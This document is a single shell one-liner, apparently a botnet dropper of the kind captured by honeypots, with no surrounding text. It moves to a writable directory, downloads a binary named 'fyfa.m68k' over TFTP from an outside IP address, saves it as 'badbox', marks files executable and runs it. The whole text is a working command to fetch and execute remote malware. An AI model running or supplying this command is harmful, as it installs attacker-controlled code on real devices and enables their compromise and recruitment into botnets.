cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.m68k -g 185.158.115.99;cat fyfa.m68k >badbox;chmod +x *;./badbox
